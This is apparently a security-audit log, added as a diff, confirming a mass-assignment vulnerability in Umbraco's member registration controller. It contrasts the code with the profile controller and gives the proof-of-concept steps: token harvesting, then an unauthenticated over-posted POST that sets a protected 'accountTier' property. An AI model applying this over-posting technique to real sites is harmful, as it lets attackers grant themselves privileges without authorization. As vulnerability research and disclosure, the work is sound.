@@ -1,0 +1,35 @@
+==============================================================================
+VULN-008: Member self-registration mass-assignment (MemberCanEditProperty not enforced)
+==============================================================================
+[INFO] target: http://localhost:29184
+[INFO] vulnerable code path: UmbRegisterController.cs:156-160 (no MemberCanEditProperty filter) vs UmbProfileController.cs:142-150
+[PROOF] REGISTER loop (UmbRegisterController.cs:156-160) — filters by alias-exists only:
+[INFO]   foreach (MemberPropertyModel property in model.MemberProperties.Where(p => p.Value != null)
+[INFO]   .Where(property => member.Properties.Contains(property.Alias)))
+[INFO]   {
+[INFO]   member.Properties[property.Alias]?.SetValue(property.Value);
+[INFO]   }
+[PROOF] PROFILE loop (UmbProfileController.cs:142-150) — additionally enforces MemberCanEditProperty:
+[INFO]   foreach (MemberPropertyModel property in model.MemberProperties
+[INFO]   
+[INFO]   // ensure the property they are posting exists
+[INFO]   .Where(p => memberType?.PropertyTypeExists(p.Alias) ?? false)
+[INFO]   .Where(property => member.Properties.Contains(property.Alias))
+[INFO]   
+[INFO]   // needs to be editable
+[INFO]   .Where(p => memberType?.MemberCanEditProperty(p.Alias) ?? false))
+[INFO]   {
+[PROOF] asymmetry confirmed: register path omits the MemberCanEditProperty gate the profile path has
+[SETUP] admin authenticated to Management API
+[SETUP] created member type 'auditMember3b51665d' with property 'accountTier' (Visibility.MemberCanEdit=FALSE)
+[SETUP] created template 'auditReg3b51665d' rendering the Register-Member form for 'auditMember3b51665d'
+[SETUP] created + published root page 'reg3b51665d' (a2071359-c91b-49b8-8075-23e2325bbf34) using that template
+[INFO] candidate front-end URLs: ['/reg3b51665d/', '/', '/reg3b51665d']
+[STEP] unauthenticated: GET http://localhost:29184/reg3b51665d/ -> 200 with a registration form (ufprt present)
+[INFO] harvested ufprt (yes), antiforgery field '__RequestVerificationToken', bind prefix 'registerModel.'
+[STEP] unauthenticated: POST registration for attacker_d9b8278b@evil.invalid with over-posted registerModel.MemberProperties[0].Alias=accountTier = 'PWNED-premium-073af8b5f46f'
+[INFO] registration POST -> HTTP 302
+[PROOF] registration accepted (redirect to current page = RegisterMemberAsync succeeded)
+[STEP] admin read-back: GET /member/c44a10f7-eab1-4057-86eb-d3fe32a2ba71
+[PROOF] member 'attacker_d9b8278b@evil.invalid' has accountTier = 'PWNED-premium-073af8b5f46f' — the EXACT attacker value, on a property flagged MemberCanEdit=FALSE (mass-assigned at registration)
+==> VULN-008: CONFIRMED — anon registrant set non-member-editable 'accountTier' via over-posting (read back = attacker value)
